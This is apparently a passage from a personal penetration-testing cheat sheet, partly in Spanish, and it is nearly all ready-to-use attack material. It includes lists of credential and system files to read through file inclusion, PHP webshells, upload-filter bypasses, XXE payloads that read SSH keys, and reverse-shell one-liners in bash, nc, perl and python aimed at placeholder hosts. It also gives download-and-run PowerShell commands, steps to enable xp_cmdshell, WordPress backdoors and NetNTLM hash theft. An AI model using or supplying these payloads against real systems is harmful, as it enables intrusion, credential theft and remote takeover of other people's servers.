/usr/local/lib/php.ini
/usr/local/php4/httpd.conf
/usr/local/php4/httpd.conf.php
/usr/local/php4/lib/php.ini
/usr/local/php5/httpd.conf
/usr/local/php5/httpd.conf.php
/usr/local/php5/lib/php.ini
/usr/local/php/httpd.conf
/usr/local/php/httpd.conf.ini
/usr/local/php/lib/php.ini
/usr/local/pureftpd/etc/pure-ftpd.conf
/usr/local/pureftpd/etc/pureftpd.pdn
/usr/local/pureftpd/sbin/pure-config.pl
/usr/local/www/logs/httpd_log
/usr/local/Zend/etc/php.ini
/usr/sbin/pure-config.pl
/var/adm/log/xferlog
/var/apache2/config.inc
/var/apache/logs/access_log
/var/apache/logs/error_log
/var/cpanel/cpanel.config
/var/lib/mysql/my.cnf
/var/lib/mysql/mysql/user.MYD
/var/local/www/conf/php.ini
/var/log/apache2/access_log
/var/log/apache2/access.log
/var/log/apache2/error_log
/var/log/apache2/error.log
/var/log/apache/access_log
/var/log/apache/access.log
/var/log/apache/error_log
/var/log/apache/error.log
/var/log/apache-ssl/access.log
/var/log/apache-ssl/error.log
/var/log/auth.log
/var/log/boot
/var/htmp
/var/log/chttp.log
/var/log/cups/error.log
/var/log/daemon.log
/var/log/debug
/var/log/dmesg
/var/log/dpkg.log
/var/log/exim_mainlog
/var/log/exim/mainlog
/var/log/exim_paniclog
/var/log/exim.paniclog
/var/log/exim_rejectlog
/var/log/exim/rejectlog
/var/log/faillog
/var/log/ftplog
/var/log/ftp-proxy
/var/log/ftp-proxy/ftp-proxy.log
/var/log/httpd-access.log
/var/log/httpd/access_log
/var/log/httpd/access.log
/var/log/httpd/error_log
/var/log/httpd/error.log
/var/log/httpsd/ssl.access_log
/var/log/httpsd/ssl_log
/var/log/kern.log
/var/log/lastlog
/var/log/lighttpd/access.log
/var/log/lighttpd/error.log
/var/log/lighttpd/lighttpd.access.log
/var/log/lighttpd/lighttpd.error.log
/var/log/mail.info
/var/log/mail.log
/var/log/maillog
/var/log/mail.warn
/var/log/message
/var/log/messages
/var/log/mysqlderror.log
/var/log/mysql.log
/var/log/mysql/mysql-bin.log
/var/log/mysql/mysql.log
/var/log/mysql/mysql-slow.log
/var/log/proftpd
/var/log/pureftpd.log
/var/log/pure-ftpd/pure-ftpd.log
/var/log/secure
/var/log/vsftpd.log
/var/log/wtmp
/var/log/xferlog
/var/log/yum.log
/var/mysql.log
/var/run/utmp
/var/spool/cron/crontabs/root
/var/webmin/miniserv.log
/var/www/html<VHOST>/__init__.py
/var/www/html/db_connect.php
/var/www/html/utils.php
/var/www/log/access_log
/var/www/log/error_log
/var/www/logs/access_log
/var/www/logs/error_log
/var/www/logs/access.log
/var/www/logs/error.log
~/.atfp_history
~/.bash_history
~/.bash_logout
~/.bash_profile
~/.bashrc
~/.gtkrc
~/.login
~/.logout
~/.mysql_history
~/.nano_history
~/.php_history
~/.profile
~/.ssh/authorized_keys
~/.ssh/id_dsa
~/.ssh/id_dsa.pub
~/.ssh/id_rsa
~/.ssh/id_rsa.pub
~/.ssh/identity
~/.ssh/identity.pub
~/.viminfo
~/.wm_style
~/.Xdefaults
~/.xinitrc
~/.Xresources
~/.xsession
```

##### Windows Files

```c
C:/Users/Administrator/NTUser.dat
C:/Documents and Settings/Administrator/NTUser.dat
C:/apache/logs/access.log
C:/apache/logs/error.log
C:/apache/php/php.ini
C:/boot.ini
C:/inetpub/wwwroot/global.asa
C:/MySQL/data/hostname.err
C:/MySQL/data/mysql.err
C:/MySQL/data/mysql.log
C:/MySQL/my.cnf
C:/MySQL/my.ini
C:/php4/php.ini
C:/php5/php.ini
C:/php/php.ini
C:/Program Files/Apache Group/Apache2/conf/httpd.conf
C:/Program Files/Apache Group/Apache/conf/httpd.conf
C:/Program Files/Apache Group/Apache/logs/access.log
C:/Program Files/Apache Group/Apache/logs/error.log
C:/Program Files/FileZilla Server/FileZilla Server.xml
C:/Program Files/MySQL/data/hostname.err
C:/Program Files/MySQL/data/mysql-bin.log
C:/Program Files/MySQL/data/mysql.err
C:/Program Files/MySQL/data/mysql.log
C:/Program Files/MySQL/my.ini
C:/Program Files/MySQL/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/my.ini
C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/access.log
C:/Program Files (x86)/Apache Group/Apache/conf/error.log
C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml
C:/Program Files (x86)/xampp/apache/conf/httpd.conf
C:/WINDOWS/php.ini
C:/WINDOWS/Repair/SAM
C:/Windows/repair/system
C:/Windows/repair/software
C:/Windows/repair/security
C:/WINDOWS/System32/drivers/etc/hosts
C:/Windows/win.ini
C:/WINNT/php.ini
C:/WINNT/win.ini
C:/xampp/apache/bin/php.ini
C:/xampp/apache/logs/access.log
C:/xampp/apache/logs/error.log
C:/Windows/Panther/Unattend/Unattended.xml
C:/Windows/Panther/Unattended.xml
C:/Windows/debug/NetSetup.log
C:/Windows/system32/config/AppEvent.Evt
C:/Windows/system32/config/SecEvent.Evt
C:/Windows/system32/config/default.sav
C:/Windows/system32/config/security.sav
C:/Windows/system32/config/software.sav
C:/Windows/system32/config/system.sav
C:/Windows/system32/config/regback/default
C:/Windows/system32/config/regback/sam
C:/Windows/system32/config/regback/security
C:/Windows/system32/config/regback/system
C:/Windows/system32/config/regback/software
C:/Program Files/MySQL/MySQL Server 5.1/my.ini
C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
C:/Windows/System32/inetsrv/config/applicationHost.config
C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
```

#### PDF PHP Inclusion

Create a file with a PDF header, which contains PHP code.

```c
%PDF-1.4

<?php
    system($_GET["cmd"]);
?>
```

```c
http://<RHOST>/index.php?page=uploads/<FILE>.pdf%00&cmd=whoami
curl "http://localhost:8000/backend/index.php?view=../../../../../../../var/crash/test.php&cmd=ls"
curl -G --data-urlencode "cmd=/dev/shm/ir.sh" http://localhost:8000/backend/index.php\?view\=../../../../../../../var/crash/test.php
```

#### PHP Upload Filter Bypasses

```c
.sh
.cgi
.inc
.txt
.pht
.phtml
.phP
.Php
.php3
.php4
.php5
.php7
.pht
.phps
.phar
.phpt
.pgif
.phtml
.phtm
.php%00.jpeg
```

```c
<FILE>.php%20
<FILE>.php%0d%0a.jpg
<FILE>.php%0a
<FILE>.php.jpg
<FILE>.php%00.gif
<FILE>.php\x00.gif
<FILE>.php%00.png
<FILE>.php\x00.png
<FILE>.php%00.jpg
<FILE>.php\x00.jpg
mv <FILE>.jpg <FILE>.php\x00.jpg
```

#### PHP Filter Chain Generator

> https://github.com/synacktiv/php_filter_chain_generator

```c
python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
python3 php_filter_chain_generator.py --chain "<?php echo shell_exec(id); ?>"
python3 php_filter_chain_generator.py --chain """<?php echo shell_exec(id); ?>"""
python3 php_filter_chain_generator.py --chain """"<?php exec(""/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"");?>""""
python3 php_filter_chain_generator.py --chain """"<?php exec(""/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"");?>""""
```

```c
http://<RHOST>/?page=php://filter/convert.base64-decode/resource=PD9waHAgZWNobyBzaGVsbF9leGVjKGlkKTsgPz4
```

```c
python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
[+] The following gadget chain will generate the following code : <?= exec($_GET[0]); ?> (base64 value: PD89IGV4ZWMoJF9HRVRbMF0pOyA/Pg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|<--- SNIP --->|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=<COMMAND>
```

#### PHP Generic Gadget Chains (PHPGGC)

```c
phpggc -u --fast-destruct Guzzle/FW1 /dev/shm/<FILE>.txt /PATH/TO/FILE/<FILE>.txt
```

#### Server-Side Request Forgery (SSRF)

```c
https://<RHOST>/item/2?server=server.<RHOST>/file?id=9&x=
```

#### Server-Side Template Injection (SSTI)

##### Fuzz String

> https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti

```c
${{<%[%'"}}%\.
```

##### Magic Payload

> https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee

```c
{{ ‘’.__class__.__mro__[1].__subclasses__() }}
```

#### Upload Vulnerabilities

```c
ASP / ASPX / PHP / PHP3 / PHP5: Webshell / Remote Code Execution
SVG: Stored XSS / Server-Side Request Forgery
GIF: Stored XSS
CSV: CSV Injection
XML: XXE
AVI: Local File Inclusion / Server-Side request Forgery
HTML/JS: HTML Injection / XSS / Open Redirect
PNG / JPEG: Pixel Flood Attack
ZIP: Remote Code Exection via Local File Inclusion
PDF / PPTX: Server-Side Request Forgery / Blind XXE
```

#### Gobuster

Use of SecLists/Discovery/Web-Content/raft-small-words.txt for the .git, .php ..

```c
-e    // extended mode that renders the full url
-k    // skip ssl certificate validation
-r    // follow cedirects
-s    // status codes
-b    // exclude status codes
-k            // ignore certificates
--wildcard    // set wildcard option

$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>/ -x php
$ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://<RHOST>/ -x php,txt,html,js -e -s 200
$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u https://<RHOST>:<RPORT>/ -b 200 -k --wildcard
```

#### wfuzz

```c
wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt -u http://<RHOST>/FUZZ/<FILE>.php --hc '403,404'
```

##### Write to File

```c
wfuzz -w /PATH/TO/WORDLIST -c -f <FILE> -u http://<RHOST> --hc 403,404
```

##### Custom Scan with limited Output

```c
wfuzz -w /PATH/TO/WORDLIST -u http://<RHOST>/dev/304c0c90fbc6520610abbf378e2339d1/db/file_FUZZ.txt --sc 200 -t 20
```

##### Fuzzing two Parameters at once

```c
wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>:/<directory>/FUZZ.FUZ2Z -z list,txt-php --hc 403,404 -c
```

##### Domain

```c
wfuzz --hh 0 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.<RHOST>' -u http://<RHOST>/
```

##### Subdomain

```c
wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.<RHOST>" --hc 200 --hw 356 -t 100 <RHOST>
```

##### Git

```c
wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -u http://<RHOST>/FUZZ --hc 403,404
```
##### Login

```c
wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "email=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST/<WORDLIST> --hc 200 -c
wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "username=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST/<WORDLIST> --ss "Invalid login"
```

##### SQL

```c
wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d 'db=FUZZ' --hl 16 http://<RHOST>/select http
```

##### DNS

```c
wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Origin: http://FUZZ.<RHOST>" --filter "r.headers.response~'Access-Control-Allow-Origin'" http://<RHOST>/
wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,404,403 -H "Host: FUZZ.<RHOST>" -u http://<RHOST> -t 100
wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,403,404 -H "Host: FUZZ.<RHOST>" -u http://<RHOST> --hw <value> -t 100
```

##### Numbering Files

```c
wfuzz -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt --hw 31 http://10.13.37.11/backups/backup_2021052315FUZZ.zip
```

##### User Enumeration

```c
wfuzz -c -t 400 -L  --hc=404 -w /usr/share/secList/Username/Name/names -d "username=FUZZ&password=password" --hs "ERROR MESAGE" http://IP/login.php/
wfuzz -c -z file,/opt/SecLists/Usernames/Names/names.txt --sc 200 -d "username=FUZZ&passwd=Q3VybGluZzIwMTgh&option=com_login&task=login&return=aW5kZXgucGhw&b7c415b2f0a3452207ba6531f8cfdb09=1"  http://IP/administrator/index.php
```
##### Port discovery

```c
wfuzz -c -t 400 -L  --hw=0 --hc=404 -w ports.txt 'http://IP:PORT/url.php?path=http://localhost:FUZZ'
```

##### Enumerating PIDs

```c
wfuzz -u 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline' -z range,900-1000
```

##### Cookies

```c
wfuzz -H 'Cookie: COKIE'
```
#### Ferobuster

```c
 feroxbuster -u http://IP:PORT -o OutputFile -x git,php,txt,pdf
```

Extract links 

```c
feroxbuster -u http://127.1 --extract-links
```


#### WPScan

```c
wpscan --url https://<RHOST> --enumerate u,t,p
wpscan --url https://<RHOST> --plugins-detection aggressive
wpscan --url https://<RHOST> --disable-tls-checks
wpscan --url https://<RHOST> --disable-tls-checks --enumerate u,t,p
wpscan --url http://<RHOST> -U <USERNAME> -P passwords.txt -t 50
wpscan --url 'IP' --enumerate vp, u
```
Certificate information

```c
openssl s_client -connect IP:PORT  
```

#### XML External Entity (XXE)

##### Skeleton Payload Request

```c
GET / HTTP/1.1
Host: <RHOST>:<RPORT>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Length: 136

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://<LHOST>:80/shell.php" >]>
<foo>&xxe;</foo>
```

##### Payloads

```c
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xxe [ <!ENTITY passwd SYSTEM 'file:///etc/passwd'> ]>
 <stockCheck><productId>&passwd;</productId><storeId>1</storeId></stockCheck>
```

```c
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]><order><quantity>3</quantity><item>&test;</item><address>17th Estate, CA</address></order>
```

```c
username=%26username%3b&version=1.0.0--><!DOCTYPE+username+[+<!ENTITY+username+SYSTEM+"/root/.ssh/id_rsa">+]><!--
```
#### Path Traversal

https://book.hacktricks.xyz/pentesting-web/file-inclusion
List
```c
/home/USER/.ssh/.id_rsa
/etc/passwd
/etc/shadow
/etc/login.def
/proc/net/tcp puertos internos de la maquina
cat tcp.txt| awk '{print $2}' | grep -v "address" | awk '{print $2}' FS=: | sort -u
listar puertos internos abiertos de la maquina
curl -s "http://=/proc/net/tcp" | awk '{print $2}' | grep -v "local_address" | awk '{print $2}'  FS=":" | sort -u
en hexadecimal
```

con python3 → 0x0016
Mas opciones en -> https://github.com/carlospolop/Auto_Wordlists

Si es PHP devuelve el output como base64

```c
/index.php?file=php://filter/convert.base64-encode/resource=FILE.php
```

Procesos de la maquina
```c
/proc/sched_debug
/proc/self/environ
/proc/self/cmdline
/proc/self/cwd current working directory
```

ruta para ver las redes internas

```c
curl -s "http://=/proc/net/fib_trie" |grep -i "host local" -B 1 | grep -oP '\d{1,3}\d{1,3}\d{1,3}\d{1,3}' | sort -u
```

```c
for port in $(curl); do echo "[port] -> Puerto $(echo "ibase=16; $port" | bc)"; done
```

Para metodo de LFI

Probar con
....//....//....//
para ver si hay sanitizacion de ../
Probar con Unicode https://jlajara.gitlab.io/Bypass_WAF_Unicode https://book.hacktricks.xyz/pentesting-web/unicode-normalization-vulnerability

niginx paths

```c
/etc/nginx
/etc/nginx/nginx.conf/etc/nginx/nginx.conf
/etc/nginx/sites-available/
/etc/nginx/sites-enabled/
/var/log/nginx/access.log
/var/log/nginx/error.log
```

Windows
```c
C:\inetpub\logs\LogFiles\W3SVC1\
C:\inetpub\wwwroot\web.config
```

#### Command Injection

En Windows to see if the commands are executed in cmd or pwsh
```c
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

Url ecoded

```c
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://LOCALIP:PORT/file
```

##### Shells on Web

###### Linux
With sanitization
```c
echo "BASE64_code" | base64 -d | bash
```

```c
echo "bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'" | base64 -w 0
```

```c
echo CODE |base64 -d | bash
```

```c
cat /etc/hosts
```

```c
cat /e??/host?
? used for autocompletion
```
  
```c
 /bin/n? -e /bin/bas?/ 
```

###### PHP

```c
<?php
			echo -e '#!/bin/bash\n\nbash -e >& /dev/tcp/IP/PORT 0>&1'
?>
```

```c
<?php
			system('rm /tmp/f;mkfilo /tmp/f;cat /tmp/f|/bin/sh -i 2>1|nc IP PORT >/tmp/f');
?>
```

```c
php --interactive
urlencode("SHELL")
```

```c
<?php
			system('bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"')
?>
```

```c
<?php 
			echo shell_exec("/usr/local/bin/wget http://IP:PORT/php-reverse-shell.php -O /var/tmp/shell.php 2>&1");
?>
```

```c
<?php exec("wget -O /var/www/htlm/shell.php http://IP/t.php"); ?>
```

```c
<?php system($_REQUEST['cmd']);?>
```

```c
<?php
			echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

```c
<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

Usage: curl "http://IP/index.php?page=http://LOCAL_IP_SERVER/backdoor.php&cmd=COMMAND"
```

##### RFI

All the WebShells

https://github.com/xl7dev/WebShell 

###### IPV6

```c
bash -i >i /dev/tcp/IPV6/PORT 0>&1
```

###### Linux

```c
nc -c bash 10.10.14.6 444
```

```c
'/bin/bash -i > /dev/tcp/'.$ip.'/'.$port.' 0<&1 2>&1'
```

URL-Encode

```c
?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/IP/PORT%200%3E%261%22
```

In url → http://IP/uploads/FILE.php.png?cmd=whoami

```c
?cmd=nc -e /bin/bash IP PORT
```

```c
'/usr/bin/nc '.$ip.' '.$port.' -e /bin/bash'
```

```c
bash -i >& /dev/tcp/IP/PORT 0>&1
```

```c
?cmd=bash -c "bash -i >%26 /dev/tcp/IP/PORT 0>%261"
```

```c
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP POrt >/tmp/f
system("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+IP+PORT+>/tmp/f")%3b&text=x
```

```c
 '0<&196;exec 196<>/dev/tcp/'.$ip.'/'.$port.'; /bin/sh <&196 >&196 2>&196',
```

```c
/usr/local/bin/wget http://10.10.14.8:8000/rev.php -O /var/tmp/shell.php 2>&1
```

###### Windows

```c
nc.exe -e cmd 10.10.14.6 443
nc.exe%20-e%20cmd%20IP%20PORT
```

```c
?cmd=cmd.exe -i >& /dev/tcp/IP/PORT 0>&1
```

```c
nc.exe -nv '.$ip.' '.$port.' -e cmd.exe'
```

###### Perl

```c
  "/usr/bin/perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"".$ip.":".$port."\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
    'perl -e \'use Socket;$i="'.$ip.'";$p='.$port.';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''
    
    perl -e 'use Socket;$i="10.10.14.6";$p=444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

###### Telnet

```c
'rm -f /tmp/p; mknod /tmp/p p && telnet '.$ip.' '.$port.' 0/tmp/p'
```

###### Python

```c
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

###### File to shell File Bypass

Cheks
•  uploading .php file instead of jpg file.
•  double extensions to bypass and upload php file pic.jpg.php or pic.php.jpg php.png
•  Changing Content-type filtering i.e., changing Content-Type: txt/php to image/jpg
•  Case sensitives — pic.PhP also tried pic.php5, pHP5.
•  Special characters to bypass pic.php%00 , pic.php%0a, pic.php%00. Add null byte (%00) on filename
•  Content-Type of an imagen and php code 

Magic numbers

https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5

Magic bytes: → JPEG 

```c
ff d8 ff e0
```

```c
head -c 20 FILE | xdd
xxd test.zip | head
```

Create a revershell php with magic number de png

```c
head -c 20 FILE.png  > pngMagicnumbers
```

```c
cat pngMagicnumbers shell.php > magicShell.php
```

In Burp 

```c
Content-Disposition: form-data; name="image"; filename="phprev.jpeg"
Content-Type: application/x-php
```
#### Technologies

##### Tomcat

Path /manager/html
Try to brute force
Upload a ,war file

```c
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war -o revshell.war
```
##### Joomla

https://hackertarget.com/attacking-enumerating-joomla/
go tu rute 

```c
http://IP/administrator/manifests/files/joomla.xm
```
Go to template and change index.php for a revershell

https://www.hackingarticles.in/joomla-reverse-shell/

##### WORDPRESS
login en 
```c
wp-admin
```

Enumerate plugins 

http://IP/wp-content/ or http://IP/wp-content/plugins

```c
wpscan --url http://172.31.1.14 -e ap --plugins-detection aggressive
```

Users  
```c
wp-json/wp/v2/users/
```

Fuzz plugins
```c
wfuzz -c --hc=404 -t 200 -w wp-plugins.fuzz.txt http://IP/FUZZ
```

Edit in Apperance the theme 404 with php revershell of pentestmonkey

```c
function webshell(){
	echo shell_exec($_GET['cmd']);
}
add_action('wp_head', 'web_shell');
```

Check if xml-rpc

```c
curl -s -X POST http://IP/xmlrpc.php -d '<?xml version="1.0" encoding="utf-8"?><methodCall>  
<methodName>system.listMethods</methodName>  
<params></params>  
</methodCall>'
```

Ping back

```c
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>https://postb.in/1562017983221-4377199190203</string></value>
</param>
<param>
<value><string>https://example.com/</string></value>
</param>
</params>
</methodCall>
```

### Database Analysis

#### impacket-mssqlclient

##### Common Commands

```c
enum_logins
enum_impersonate
```

##### Connection

```c
impacket-mssqlclient <USERNAME>@<RHOST>
impacket-mssqlclient <USERNAME>@<RHOST> -windows-auth
impacket-mssqlclient -k -no-pass <RHOST>
impacket-mssqlclient <RHOST>/<USERNAME>:<USERNAME>@<RHOST> -windows-auth
mssqlclient.py -windows-auth <SYSTEM_USER>@<IP> //with password
```

```c
export KRB5CCNAME=<USERNAME>.ccache
impacket-mssqlclient -k <RHOST>.<DOMAIN>
```

#### MongoDB

```c
mongo "mongodb://localhost:27017"
```

```c
> use <DATABASE>;
> show tables;
> show collections;
> db.system.keys.find();
> db.users.find();
> db.getUsers();
> db.getUsers({showCredentials: true});
> db.accounts.find();
> db.accounts.find().pretty();
> use admin;
```

##### User Password Reset to "12345"

```c
> db.getCollection('users').update({username:"admin"}, { $set: {"services" : { "password" : {"bcrypt" : "$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG" } } } })
```

#### MSSQL

##### Connection

```c
sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'
impacket-mssqlclient <USERNAME>:<PASSWORD>@<RHOST> -windows-auth
```

Enable xp_cmdshell

```c
-- To allow advanced options to be changed.
EXEC sp_configure 'show advanced options', 1
GO
-- To update the currently configured value for advanced options.
RECONFIGURE
GO
-- To enable the feature.
EXEC sp_configure 'xp_cmdshell', 1
GO
-- To update the currently configured value for this feature.
RECONFIGURE
GO
```

```c
xp_cmdshell "powershell "IEX (New-ObjectNet.WebClient).DownloadString(\"http://IP:PORT/rev.ps1\");"
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://IP:PORT/rev.ps1") | powershell -noprofile'
```

```c
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
```

```c
crackmapexec mssql -d <Domain name> -u <username> -p <password> 
```

```c
mssqlclient.py  -db volume -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
```

```c
sqsh -S <IP> -U <Username> -P <Password> -D <Database>
```

###### Enumeartion of MSSQL


Get Instance

```c
powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
Import-Module PowerUp.ps1
Invoke-AllChecks
powershell Get-SQLInstanceDomain
powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo // If multiple
.\SQLRecon.exe /enum:sqlspns
```

Check if connection is possible

```c
powershell Get-SQLConnectionTest -Instance "<INSTANCE>" | fl
```

```c
.\SQLRecon.exe /auth:wintoken /host:<ComputerName> /module:info
```

Show roles of users

```c
.\SQLRecon.exe /a:wintoken /h:<INSTANCE> /m:whoami
```

Find user or groups that have access

```c
powershell Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }
```

With credentials

```c
.\SQLRecon.exe /a:windomain /d:<DOMAIN> /u:<mssql_svc> /p:<PASSWORD> /h:<INSTANCE> /m:whoami
```

Queries

```c
powershell Get-SQLQuery -Instance "<INSTANCE>" -Query "select @@servername"
.\SQLRecon.exe /a:wintoken /h:<INSTANCE> /m:query /c:"select @@servername"
```

Impersonate

```c
.\SQLRecon.exe /a:wintoken /h:<INSTANCE> /m:impersonate

SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;
```

Run impersonation

Get system user

```c
powershell Invoke-SQLOSCmd -Instance "<INSTANCE>" -Command "whoami" -RawResults
```

```c
.\SQLRecon.exe /a:wintoken /h:<INSTANCE> /m:iwhoami /i:<SYSTEM_USER>
```

```c
.\SQLRecon.exe /a:wintoken /h:<INSTANCE> /m:ienablexp /i:<DEV\mssql_svc>
.\SQLRecon.exe /a:wintoken /h:<INSTANCE> /m:ixpcmd /i:<DEV\mssql_svc> /c:ipconfig //run commands with /c
.\SQLRecon.exe /a:wintoken /h:<INSTANCE> /m:links // see link servers
.\SQLRecon.exe /a:wintoken /h:<INSTANCE> /m:lquery /l:<LINKED_SERVERNAME> /c:"select @@servername"
.\SQLRecon.exe /a:wintoken /h:<INSTANCE> /m:lquery /l:<LINKED_SERVERNAME> /c:"select name,value from sys.configurations WHERE name = ''xp_cmdshell''"
powershell Get-SQLServerLinkCrawl -Instance "<INSTANCE>"
.\SQLRecon.exe /a:wintoken /h:<INSTANCE> /m:lwhoami /l:<LINKED_SERVERNAME>
```

###### Run MSSQL Commands

```c
SELECT srvname, srvproduct, rpcout FROM master..sysservers;
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;
EXECUTE AS login = '<SYSTEM_USER>'; SELECT SYSTEM_USER;
EXECUTE AS login = '<SYSTEM_USER>'; SELECT IS_SRVROLEMEMBER('sysadmin');
```

##### Common Commands

```c
SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM <DATABASE>.information_schema.tables;
SELECT * FROM <DATABASE>.dbo.users;
SELECT * FROM OPENQUERY("<SQL_INSTANCE", 'select @@servername'); // query other db
```

###### Privelege Escalation

Encode payload 

```c
$str = "iex (new-object net.webclient).downloadstring('http://wkstn-2:8080/b')"
powershell -w hidden -c "iex (new-object net.webclient).downloadstring('http://wkstn-2:8080/b')"
[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('Motörhead'))
```

```c
\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc <ENCONDE>"
```

##### Show Database Content

```c
1> SELECT name FROM master.sys.databases
2> go
```

##### OPENQUERY

```c
1> select * from openquery("web\clients", 'select name from master.sys.databases');
2> go
```

```c
1> select * from openquery("web\clients", 'select name from clients.sys.objects');
2> go
```

##### Binary Extraction as Base64

```c
1> select cast((select content from openquery([web\clients], 'select * from clients.sys.assembly_files') where assembly_id = 65536) as varbinary(max)) for xml path(''), binary base64;
2> go > export.txt
```

##### Steal NetNTLM Hash / Relay Attack

```c
SQL> exec master.dbo.xp_dirtree '\\<LHOST>\FOOBAR'
```

##### Linked SQL Server Enumeration

